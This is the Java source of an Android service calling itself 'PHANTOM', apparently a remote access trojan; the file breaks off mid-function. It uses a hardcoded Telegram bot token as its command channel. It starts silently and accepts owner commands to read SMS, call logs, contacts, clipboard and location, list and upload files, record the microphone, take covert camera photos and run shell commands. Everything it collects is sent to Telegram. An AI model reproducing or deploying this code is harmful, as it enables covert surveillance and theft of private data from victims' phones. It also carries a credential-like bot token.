package com.tenix.phantom;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.WallpaperManager;
import android.content.BroadcastReceiver;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.location.Location;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Size;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class inq extends Service {

    // CONFIG - edit with MT Manager
    static String BOT_TOKEN = "8846771755:AAHpLMb07quH2TR9Vw5m40RUHzPOOTtBdR8";
    static String OWNER_ID  = "7507787272";

    private static volatile boolean running = false;
    private static volatile boolean polling = false;
    private long lastUpdateId = 0;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        silentForeground();
        if (running) return START_STICKY;
        running = true;
        new Thread(() -> {
            stopForeground(true);
            try {
                sendText("PHANTOM Online\n" + buildDeviceInfo(), OWNER_ID);
                pollCommands();
            } catch (Exception ignored) {}
            finally { running = false; }
        }).start();
        return START_STICKY;
    }

    @Override public IBinder onBind(Intent i) { return null; }
    @Override public void onDestroy() { polling = false; running = false; super.onDestroy(); }

    // ── Polling ──────────────────────────────────

    private void pollCommands() {
        polling = true;
        while (polling) {
            try {
                String url = "https://api.telegram.org/bot" + BOT_TOKEN
                        + "/getUpdates?timeout=25&offset=" + (lastUpdateId + 1)
                        + "&allowed_updates=%5B%22message%22%5D";
                HttpURLConnection c = open(url, 30000, 30000);
                if (c.getResponseCode() == 200) {
                    String body = drain(c.getInputStream());
                    c.disconnect();
                    parseAndHandle(body);
                } else { c.disconnect(); Thread.sleep(3000); }
            } catch (Exception e) { try { Thread.sleep(5000); } catch (InterruptedException ignored) {} }
        }
    }

    private void parseAndHandle(String json) {
        int idx = 0;
        while (true) {
            int uIdx = json.indexOf("\"update_id\":", idx);
            if (uIdx < 0) break;
            int uEnd = json.indexOf(',', uIdx + 12);
            if (uEnd < 0) break;
            long uid = Long.parseLong(json.substring(uIdx + 12, uEnd).trim());
            lastUpdateId = uid;
            int cidIdx = json.indexOf("\"chat\":{\"id\":", uIdx);
            if (cidIdx < 0) { idx = uEnd; continue; }
            int cidEnd = json.indexOf(',', cidIdx + 13);
            if (cidEnd < 0) cidEnd = json.indexOf('}', cidIdx + 13);
            String chatId = json.substring(cidIdx + 13, cidEnd).trim();
            if (!chatId.equals(OWNER_ID)) { idx = uEnd; continue; }
            int txtIdx = json.indexOf("\"text\":\"", uIdx);
            if (txtIdx < 0) { idx = uEnd; continue; }
            txtIdx += 8;
            StringBuilder sb = new StringBuilder();
            for (int i = txtIdx; i < json.length(); i++) {
                char ch = json.charAt(i);
                if (ch == '\\' && i + 1 < json.length()) {
                    char nx = json.charAt(i + 1);
                    if (nx == '"') { sb.append('"'); i++; continue; }
                    if (nx == 'n') { sb.append('\n'); i++; continue; }
                    if (nx == '/') { sb.append('/'); i++; continue; }
                    if (nx == '\\') { sb.append('\\'); i++; continue; }
                } else if (ch == '"') { idx = i + 1; break; }
                sb.append(ch);
            }
            final String text = sb.toString().trim();
            final String cid = chatId;
            new Thread(() -> handleCommand(text, cid)).start();
        }
    }

    // ── Command Router ───────────────────────────

    private void handleCommand(String cmd, String cid) {
        try {
            String low = cmd.toLowerCase();
            if (low.equals("/start") || low.equals("/help")) { sendText(helpText(), cid); }
            else if (low.equals("/info"))           { sendText(buildDeviceInfo(), cid); }
            else if (low.equals("/number"))         { sendText(getPhoneNumber(), cid); }
            else if (low.startsWith("/where"))      { sendText(getLocation(), cid); }
            else if (low.startsWith("/sms"))        { sendText(readSMS(parseArg(cmd, 10)), cid); }
            else if (low.startsWith("/calls"))      { sendText(readCallLog(parseArg(cmd, 10)), cid); }
            else if (low.startsWith("/contacts"))   { sendText(readContacts(parseArg(cmd, 20)), cid); }
            else if (low.startsWith("/apps"))       { sendText("Generating app list...", cid); sendAppListAsFile(cid); }
            else if (low.equals("/clip"))           { doClipboard(cid); }
            else if (low.equals("/battery"))        { sendText(getBattery(), cid); }
            else if (low.equals("/wifi"))           { sendText(getWifi(), cid); }
            else if (low.startsWith("/ls"))         { listAndShow(cmd.length() > 4 ? cmd.substring(3).trim() : "/sdcard/", cid); }
            else if (low.startsWith("/get "))       { doGetFile(cmd.substring(5).trim(), cid); }
            else if (low.startsWith("/mic"))        { int s = parseArg(cmd, 10); sendText("Recording " + s + "s...", cid); recordMic(s, cid); }
            else if (low.startsWith("/snap"))       { boolean fr = low.contains("front"); sendText("Capturing " + (fr ? "front" : "back") + "...", cid); snapCamera(fr, cid); }
            else if (low.startsWith("/flash"))      { flashlight(low.contains("on"), cid); }
            else if (low.startsWith("/bright"))     { setBrightness(parseArg(cmd, 128), cid); }
            else if (low.startsWith("/wall"))       { handleWallpaper(cmd, cid); }
            else if (low.startsWith("/sh "))        { sendText(execShell(cmd.substring(4).trim()), cid); }
            else if (low.equals("/kill"))           { sendText("PHANTOM shutting down...", cid); polling = false; running = false; stopSelf(); }
            else { sendText("Unknown command. /help", cid); }
        } catch (Exception e) { sendText("Error: " + e.getMessage(), cid); }
    }

    private String helpText() {
        return "PHANTOM Commands\n\n"
            + "/info\n/number\n/where\n/sms [n]\n/calls [n]\n/contacts [n]\n"
            + "/apps\n/clip\n/battery\n/wifi\n"
            + "/ls [path]\n/get [path]\n"
            + "/mic [secs]\n/snap [front|back]\n"
            + "/flash [on|off]\n/bright [0-255]\n"
            + "/wall [home|lock] [url]\n/sh [cmd]\n/kill";
    }

    // ── Device Info ──────────────────────────────

    @SuppressLint("HardwareIds")
    private String buildDeviceInfo() {
        StringBuilder sb = new StringBuilder("Device Info\n\n");
        sb.append("Brand: ").append(Build.BRAND).append("\n");
        sb.append("Model: ").append(Build.MODEL).append("\n");
        sb.append("Android: ").append(Build.VERSION.RELEASE).append(" SDK").append(Build.VERSION.SDK_INT).append("\n");
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) sb.append("Network: ").append(tm.getNetworkOperatorName()).append("\n");
        } catch (Exception ignored) {}
        sb.append("Pkg: ").append(getPackageName());
        return sb.toString();
    }

    // ── Phone Number (FIXED) ─────────────────────

    @SuppressLint({"HardwareIds", "MissingPermission"})
    private String getPhoneNumber() {
        List<String> found = new ArrayList<>();
        // Source 1: TelephonyManager
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                String n = tm.getLine1Number();
                if (n != null && n.length() > 3 && !n.equals("0")) found.add("SIM1: " + n);
            }
        } catch (Exception ignored) {}
        // Source 2: SubscriptionManager (most reliable on modern Android)
        if (Build.VERSION.SDK_INT >= 22) {
            try {
                SubscriptionManager sm = (SubscriptionManager)
                        getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                if (sm != null) {
                    List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
                    if (subs != null) {
                        for (SubscriptionInfo si : subs) {
                            String num = si.getNumber();
                            if (num != null && num.length() > 3) {
                                String entry = "SIM" + (si.getSimSlotIndex() + 1) + ": " + num;
                                if (!found.contains(entry)) found.add(entry);
                            }
                        }
                    }
                }
            } catch (Exception ignored) {}
        }
        if (found.isEmpty()) {
            try {
                TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                if (tm != null) {
                    return "Phone number not accessible\nOperator: " + tm.getNetworkOperatorName()
                         + "\nSIM State: " + tm.getSimState();
                }
            } catch (Exception ignored) {}
            return "Phone number: not accessible (carrier restriction)";
        }
        StringBuilder sb = new StringBuilder("Phone Numbers\n");
        for (String s : found) sb.append(s).append("\n");
        return sb.toString().trim();
    }

    // ── Location ─────────────────────────────────

    @SuppressLint("MissingPermission")
    private String getLocation() {
        LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        if (lm == null) return "No location service";
        Location best = null;
        for (String p : new String[]{LocationManager.GPS_PROVIDER,
                                     LocationManager.NETWORK_PROVIDER,
                                     LocationManager.PASSIVE_PROVIDER}) {
            try {
                Location l = lm.getLastKnownLocation(p);
                if (l != null && (best == null || l.getAccuracy() < best.getAccuracy())) best = l;
            } catch (Exception ignored) {}
        }
        if (best == null) return "Location not available";
        return "Location\nhttps://maps.google.com/?q=" + best.getLatitude() + "," + best.getLongitude()
             + "\nLat: " + best.getLatitude() + "\nLon: " + best.getLongitude()
             + "\nAccuracy: " + (int) best.getAccuracy() + "m";
    }

    // ── SMS ──────────────────────────────────────

    private String readSMS(int count) {
        StringBuilder sb = new StringBuilder("Last " + count + " SMS\n\n");
        try (Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"),
                new String[]{"address", "body"}, null, null, "date DESC")) {
            int i = 0;
            while (c != null && c.moveToNext() && i < count) {
                sb.append("From: ").append(nullSafe(c.getString(0))).append("\n");
                sb.append(nullSafe(c.getString(1))).append("\n------\n");
                i++;
            }
        } catch (Exception e) { return "SMS Error: " + e.getMessage(); }
        return sb.toString();
    }

    // ── Call Log ─────────────────────────────────

    private String readCallLog(int count) {
        StringBuilder sb = new StringBuilder("Call Log\n\n");
        try (Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION},
                null, null, CallLog.Calls.DATE + " DESC")) {
            int i = 0;
            while (c != null && c.moveToNext() && i < count) {
                String t;
                switch (c.getInt(1)) {
                    case CallLog.Calls.INCOMING_TYPE: t = "IN "; break;
                    case CallLog.Calls.OUTGOING_TYPE: t = "OUT"; break;
                    case CallLog.Calls.MISSED_TYPE:   t = "MIS"; break;
                    default: t = "???";
                }
                sb.append(t).append(" ").append(nullSafe(c.getString(0)))
                  .append(" ").append(c.getInt(2)).append("s\n");
                i++;
            }
        } catch (Exception e) { return "Call log error: " + e.getMessage(); }
        return sb.toString();
    }

    // ── Contacts ─────────────────────────────────

    private String readContacts(int count) {
        StringBuilder sb = new StringBuilder("Contacts\n\n");
        try (Cursor c = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                             ContactsContract.CommonDataKinds.Phone.NUMBER},
                null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")) {
            int i = 0;
            while (c != null && c.moveToNext() && i < count) {
                sb.append(nullSafe(c.getString(0))).append(": ").append(nullSafe(c.getString(1))).append("\n");
                i++;
            }
        } catch (Exception e) { return "Contacts error: " + e.getMessage(); }
        return sb.toString();
    }

    // ── App List as TXT file (FIXED) ─────────────

    private void sendAppListAsFile(String cid) {
        try {
            PackageManager pm = getPackageManager();
            List<PackageInfo> all = pm.getInstalledPackages(PackageManager.GET_PERMISSIONS);
            List<PackageInfo> user = new ArrayList<>();
            List<PackageInfo> sys  = new ArrayList<>();
            for (PackageInfo pi : all) {
                if ((pi.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) sys.add(pi);
                else user.add(pi);
            }
            File out = new File(getCacheDir(), "apps.txt");
            FileOutputStream fos = new FileOutputStream(out);
            write(fos, "PHANTOM App List | Total: " + all.size()
                + " | User: " + user.size() + " | System: " + sys.size() + "\n"
                + "Device: " + Build.BRAND + " " + Build.MODEL + "\n"
                + "====================================\n\n");
            write(fos, "USER APPS (" + user.size() + ")\n--------------------\n");
            for (PackageInfo pi : user) writeApp(fos, pm, pi);
            write(fos, "\nSYSTEM APPS (" + sys.size() + ")\n--------------------\n");
            for (PackageInfo pi : sys) writeApp(fos, pm, pi);
            fos.close();
            sendFile(out, Build.MODEL.replace(" ", "_") + "_apps.txt", cid);
        } catch (Exception e) { sendText("App list error: " + e.getMessage(), cid); }
    }

    private void writeApp(FileOutputStream fos, PackageManager pm, PackageInfo pi) throws IOException {
        String name = nullSafe(pi.applicationInfo.loadLabel(pm).toString());
        StringBuilder sb = new StringBuilder();
        sb.append("Name:    ").append(name).append("\n");
        sb.append("Package: ").append(pi.packageName).append("\n");
        sb.append("Version: ").append(nullSafe(pi.versionName)).append("\n");
        if (pi.requestedPermissions != null && pi.requestedPermissions.length > 0) {
            sb.append("Perms (").append(pi.requestedPermissions.length).append("):\n");
            for (String p : pi.requestedPermissions) {
                int dot = p.lastIndexOf('.');
                sb.append("  ").append(dot >= 0 ? p.substring(dot + 1) : p).append("\n");
            }
        }
        sb.append("\n");
        write(fos, sb.toString());
    }

    // ── Clipboard (FIXED) ────────────────────────
    // Fix: Read on main thread → store in array → signal latch → send from bg thread

    private void doClipboard(String cid) {
        final String[] result = {null};
        final CountDownLatch latch = new CountDownLatch(1);
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                if (cm != null && cm.hasPrimaryClip() && cm.getPrimaryClip() != null
                        && cm.getPrimaryClip().getItemCount() > 0) {
                    CharSequence t = cm.getPrimaryClip().getItemAt(0).coerceToText(getApplicationContext());
                    if (t != null && t.length() > 0) result[0] = t.toString();
                }
            } catch (Exception e) { result[0] = "ERROR: " + e.getMessage(); }
            finally { latch.countDown(); }
        });
        try { latch.await(3, TimeUnit.SECONDS); } catch (InterruptedException ignored) {}
        sendText("Clipboard:\n" + (result[0] != null ? result[0] : "(empty)"), cid);
    }

    // ── Mic (FIXED) ──────────────────────────────
    // Fix: Try multiple audio sources; verify file > 1KB before sending

    @SuppressWarnings("deprecation")
    private void recordMic(int seconds, String cid) {
        File out = new File(getCacheDir(), "mic_" + System.currentTimeMillis() + ".3gp");
        MediaRecorder rec = null;
        boolean started = false;
        int[] sources = {MediaRecorder.AudioSource.MIC,
                         MediaRecorder.AudioSource.CAMCORDER,
                         MediaRecorder.AudioSource.DEFAULT};
        try {
            Exception lastEx = null;
            for (int src : sources) {
                try {
                    rec = new MediaRecorder();
                    rec.setAudioSource(src);
                    rec.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                    rec.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                    rec.setAudioSamplingRate(8000);
                    rec.setAudioChannels(1);
                    rec.setAudioEncodingBitRate(12800);
                    rec.setOutputFile(out.getAbsolutePath());
                    rec.prepare();
                    rec.start();
                    started = true;
                    break;
                } catch (Exception e) {
                    lastEx = e;
                    try { rec.release(); } catch (Exception ignored) {}
                    rec = null;
                }
            }
            if (!started) {
                sendText("Mic failed: " + (lastEx != null ? lastEx.getMessage() : "all sources failed"), cid);
                return;
            }
            Thread.sleep(seconds * 1000L);
            rec.stop();
            rec.release();
            rec = null;
            if (!out.exists() || out.length() < 512) {
                sendText("Mic recorded empty file. Grant RECORD_AUDIO permission.", cid);
                return;
            }
            sendFile(out, "mic_" + seconds + "s.3gp", cid);
        } catch (Exception e) {
            if (rec != null) { try { if (started) rec.stop(); } catch (Exception ignored) {} try { rec.release(); } catch (Exception ignored) {} }
            sendText("Mic error: " + e.getMessage(), cid);
        } finally {
            if (out.exists()) out.delete();
        }
    }

    // ── Camera (FIXED) ───────────────────────────
    // Fix: Proper HandlerThread, correct capture flow, 8s timeout, file verify

    @SuppressWarnings("NewApi")
    private void snapCamera(boolean front, String cid) {
        if (Build.VERSION.SDK_INT < 21) { sendText("Camera2 needs API 21+", cid); return; }
        final File outFile = new File(getCacheDir(), "snap_" + System.currentTimeMillis() + ".jpg");
        final CountDownLatch done = new CountDownLatch(1);
        final AtomicBoolean success = new AtomicBoolean(false);
        HandlerThread ht = new HandlerThread("PCam");
        ht.start();
        Handler h = new Handler(ht.getLooper());
        CameraManager mgr = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        if (mgr == null) { sendText("No CameraManager", cid); ht.quitSafely(); return; }
        try {
            // Find camera
            String camId = null;
            int want = front ? CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK;
            for (String id : mgr.getCameraIdList()) {
                Integer f = mgr.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING);
                if (f != null && f == want) { camId = id; break; }
            }
            if (camId == null && mgr.getCameraIdList().length > 0) camId = mgr.getCameraIdList()[0];
            if (camId == null) { sendText("No camera", cid); ht.quitSafely(); return; }

            // Pick size
            StreamConfigurationMap map = mgr.getCameraCharacteristics(camId)
                    .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (map == null) { sendText("No stream config", cid); ht.quitSafely(); return; }
            Size[] sizes = map.getOutputSizes(ImageFormat.JPEG);
            Size best = sizes[0];
            for (Size s : sizes) {
                if (s.getWidth() <= 1920 && s.getWidth() * s.getHeight() > best.getWidth() * best.getHeight())
                    best = s;
            }

            final ImageReader reader = ImageReader.newInstance(best.getWidth(), best.getHeight(), ImageFormat.JPEG, 2);
            reader.setOnImageAvailableListener(r -> {
                Image img = null;
                try {
                    img = r.acquireNextImage();
                    if (img != null) {
                        ByteBuffer buf = img.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buf.remaining()];
                        buf.get(bytes);
                        FileOutputStream fos = new FileOutputStream(outFile);
                        fos.write(bytes); fos.close();
                        success.set(bytes.length > 1000);
                    }
                } catch (Exception ignored) {
                } finally { if (img != null) img.close(); done.countDown(); }
            }, h);

            @SuppressLint("MissingPermission")
            CameraDevice.StateCallback cb = new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice dev) {
                    try {
                        dev.createCaptureSession(
                                new ArrayList<android.view.Surface>() {{ add(reader.getSurface()); }},
                                new CameraCaptureSession.StateCallback() {
                                    @Override public void onConfigured(CameraCaptureSession sess) {
                                        try {
                                            CaptureRequest.Builder b = dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                            b.addTarget(reader.getSurface());
                                            b.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                                            b.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO);
                                            b.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                                            b.set(CaptureRequest.JPEG_QUALITY, (byte) 85);
                                            b.set(CaptureRequest.JPEG_ORIENTATION, front ? 270 : 90);
                                            sess.capture(b.build(), new CameraCaptureSession.CaptureCallback() {
                                                @Override public void onCaptureFailed(CameraCaptureSession s, CaptureRequest r, android.hardware.camera2.CaptureFailure f) { done.countDown(); }
                                            }, h);
                                        } catch (CameraAccessException e) { done.countDown(); dev.close(); }
                                    }
                                    @Override public void onConfigureFailed(CameraCaptureSession s) { done.countDown(); dev.close(); }
                                }, h);
                    } catch (CameraAccessException e) { done.countDown(); dev.close(); }
                }
                @Override public void onDisconnected(CameraDevice d) { d.close(); done.countDown(); }
                @Override public void onError(CameraDevice d, int e) { d.close(); done.countDown(); }
            };
            mgr.openCamera(camId, cb, h);
            done.await(8, TimeUnit.SECONDS);
        } catch (Exception e) {
            sendText("Camera error: " + e.getMessage(), cid);
            ht.quitSafely(); return;
        }
        ht.quitSafely();
        if (success.get() && outFile.exists() && outFile.length() > 0) {
            sendFile(outFile, (front ? "front" : "back") + ".jpg", cid);
            outFile.delete();
        } else {
            sendText("Camera failed (timeout/no image). Grant CAMERA permission.", cid);
        }
    }

    // ── Flashlight ───────────────────────────────

    @SuppressWarnings("NewApi")
    private void flashlight(boolean on, String cid) {
        if (Build.VERSION.SDK_INT < 23) { sendText("Flash needs Android 6+", cid); return; }
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            if (cm == null || cm.getCameraIdList().length == 0) { sendText("No flash", cid); return; }
            cm.setTorchMode(cm.getCameraIdList()[0], on);
            sendText("Flashlight: " + (on ? "ON" : "OFF"), cid);
        } catch (Exception e) { sendText("Flash error: " + e.getMessage(), cid); }
    }

    // ── Brightness (FIXED) ───────────────────────
    // Fix: canWrite() check + explain how to grant + fallback shell command

    private void setBrightness(int value, String cid) {
        value = Math.max(0, Math.min(255, value));
        if (Build.VERSION.SDK_INT >= 23 && !Settings.System.canWrite(this)) {
            sendText("Brightness: Need WRITE_SETTINGS\n\n"
                   + "Open on target device:\n"
                   + "Settings > Apps > Special app access > Modify system settings > PHANTOM > Allow\n\n"
                   + "Or try:\n/sh settings put system screen_brightness " + value, cid);
            return;
        }
        try {
            Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS_MODE,
                    Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL);
            Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, value);
            sendText("Brightness: " + value + "/255 (" + (value * 100 / 255) + "%)", cid);
        } catch (Exception e) { sendText("Brightness error: " + e.getMessage(), cid); }
    }

    // ── Wallpaper ────────────────────────────────

    private void handleWallpaper(String cmd, String cid) {
        String[] p = cmd.trim().split("\\s+");
        if (p.length < 3) { sendText("Usage: /wall [home|lock] [url]", cid); return; }
        String target = p[1].toLowerCase();
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(p[2]).openConnection();
            c.setConnectTimeout(15000); c.setReadTimeout(30000);
            Bitmap bmp = BitmapFactory.decodeStream(c.getInputStream());
            c.disconnect();
            if (bmp == null) { sendText("Failed to decode image", cid); return; }
            WallpaperManager wm = WallpaperManager.getInstance(this);
            if (Build.VERSION.SDK_INT >= 24) {
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                bmp.compress(Bitmap.CompressFormat.JPEG, 90, bos);
                int flag = target.equals("lock") ? WallpaperManager.FLAG_LOCK : WallpaperManager.FLAG_SYSTEM;
                wm.setStream(new java.io.ByteArrayInputStream(bos.toByteArray()), null, true, flag);
            } else { wm.setBitmap(bmp); }
            sendText("Wallpaper set: " + target, cid);
        } catch (Exception e) { sendText("Wallpaper error: " + e.getMessage(), cid); }
    }

    // ── File Manager (FIXED) ─────────────────────
    // Fix: Show files AND folders, /get command per file, /ls per folder
    //      Large dirs → send as .txt file

    private void listAndShow(String path, String cid) {
        File dir = new File(path);
        if (!dir.exists()) { sendText("Not found: " + path, cid); return; }
        if (!dir.isDirectory()) {
            sendText("FILE: " + dir.getName() + "\nSize: " + humanSize(dir.length())
                   + "\nPath: " + dir.getAbsolutePath()
                   + "\nDownload: /get " + dir.getAbsolutePath(), cid);
            return;
        }
        File[] entries = dir.listFiles();
        if (entries == null || entries.length == 0) {
            sendText("Path: " + path + "\n(empty or no access)", cid);
            return;
        }
        // Sort: folders first
        Arrays.sort(entries, (a, b) -> {
            if (a.isDirectory() && !b.isDirectory()) return -1;
            if (!a.isDirectory() && b.isDirectory()) return 1;
            return a.getName().compareToIgnoreCase(b.getName());
        });
        if (entries.length > 35) { sendDirAsFile(dir, entries, cid); return; }

        StringBuilder sb = new StringBuilder();
        sb.append("Path: ").append(path).append("\nItems: ").append(entries.length).append("\n\n");
        for (File f : entries) {
            if (f.isDirectory()) {
                sb.append("[DIR]  ").append(f.getName()).append("/\n");
                sb.append("       /ls ").append(f.getAbsolutePath()).append("\n\n");
            } else {
                sb.append("[FILE] ").append(f.getName()).append("\n");
                sb.append("       Size: ").append(humanSize(f.length())).append("\n");
                sb.append("       /get ").append(f.getAbsolutePath()).append("\n\n");
            }
        }
        String out = sb.toString();
        if (out.length() > 3800) { sendDirAsFile(dir, entries, cid); return; }
        sendText(out, cid);
    }

    private void doGetFile(String path, String cid) {
        File f = new File(path);
        if (!f.exists()) { sendText("Not found: " + path, cid); return; }
        if (f.isDirectory()) { listAndShow(path, cid); return; }
        sendFile(f, f.getName(), cid);
    }

    private void sendDirAsFile(File dir, File[] entries, String cid) {
        try {
            File out = new File(getCacheDir(), "ls_" + dir.getName() + ".txt");
            FileOutputStream fos = new FileOutputStream(out);
            write(fos, "Path: " + dir.getAbsolutePath() + "\nItems: " + entries.length + "\n\n");
            for (File f : entries) {
                if (f.isDirectory()) {
                    write(fos, "[DIR]  " + f.getName() + "/\n"
                             + "       /ls " + f.getAbsolutePath() + "\n\n");
                } else {
                    write(fos, "[FILE] " + f.getName() + "\n"
                             + "       Size: " + humanSize(f.length()) + "\n"
                             + "       /get " + f.getAbsolutePath() + "\n\n");
                }
            }
            fos.close();
            sendFile(out, "ls_" + dir.getName() + ".txt", cid);
        } catch (Exception e) { sendText("Dir list error: " + e.getMessage(), cid); }
    }

    private String humanSize(long b) {
        if (b < 1024) return b + " B";
        if (b < 1024 * 1024) return String.format("%.1f KB", b / 1024.0);
        if (b < 1024L * 1024 * 1024) return String.format("%.1f MB", b / (1024.0 * 1024));
        return String.format("%.2f GB", b / (1024.0 * 1024 * 1024));
    }

    // ── Battery ──────────────────────────────────

    private String getBattery() {
        try {
            Intent bi = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (bi == null) return "Battery: N/A";
            int lvl = bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scl = bi.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
            int st  = bi.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            int tmp = bi.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) / 10;
            boolean charging = st == BatteryManager.BATTERY_STATUS_CHARGING || st == BatteryManager.BATTERY_STATUS_FULL;
            return "Battery\nLevel: " + (lvl * 100 / scl) + "%\nStatus: " + (charging ? "Charging" : "Discharging") + "\nTemp: " + tmp + "C";
        } catch (Exception e) { return "Battery error: " + e.getMessage(); }
    }

    // ── WiFi ─────────────────────────────────────

    @SuppressLint("HardwareIds")
    private String getWifi() {
        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm == null || !wm.isWifiEnabled()) return "WiFi: Disabled";
            WifiInfo wi = wm.getConnectionInfo();
            int ip = wm.getDhcpInfo().ipAddress;
            String ipStr = (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
            return "WiFi\nSSID: " + wi.getSSID() + "\nIP: " + ipStr + "\nSignal: " + wi.getRssi() + " dBm\nSpeed: " + wi.getLinkSpeed() + " Mbps";
        } catch (Exception e) { return "WiFi error: " + e.getMessage(); }
    }

    // ── Shell ────────────────────────────────────

    private String execShell(String command) {
        StringBuilder sb = new StringBuilder();
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
            BufferedReader o = new BufferedReader(new InputStreamReader(p.getInputStream()));
            BufferedReader e = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            String line;
            while ((line = o.readLine()) != null) sb.append(line).append("\n");
            while ((line = e.readLine()) != null) sb.append("[ERR] ").append(line).append("\n");
            p.waitFor();
        } catch (Exception e) { return "Shell error: " + e.getMessage(); }
        String r = sb.toString().trim();
        return r.isEmpty() ? "(no output)" : r;
    }

    // ── Telegram: sendText ───────────────────────

    private void sendText(String text, String chatId) {
        try {
            if (text.length() > 3800) text = text.substring(0, 3800) + "\n...(truncated)";
            HttpURLConnection c = open("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", 10000, 15000);
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            String safe = text.replace("\\", "\\\\").replace("\"", "\\\"")
                              .replace("\n", "\\n").replace("\r", "").replace("\t", "\\t");
            String json = "{\"chat_id\":\"" + chatId + "\",\"text\":\"" + safe + "\"}";
            byte[] body = json.getBytes(StandardCharsets.UTF_8);
            c.setFixedLengthStreamingMode(body.length);
            c.getOutputStream().write(body);
            drain(c.getResponseCode() == 200 ? c.getInputStream() : c.getErrorStream());
            c.disconnect();
        } catch (Exception ignored) {}
    }

    // ── Telegram: sendFile ───────────────────────

    private void sendFile(File file, String filename, String chatId) {
        try {
            String bound = "PHB" + System.currentTimeMillis();
            HttpURLConnection c = open("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument", 30000, 300000);
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setChunkedStreamingMode(16384);
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + bound);
            DataOutputStream out = new DataOutputStream(c.getOutputStream());
            out.writeBytes("--" + bound + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            out.writeBytes(chatId + "\r\n");
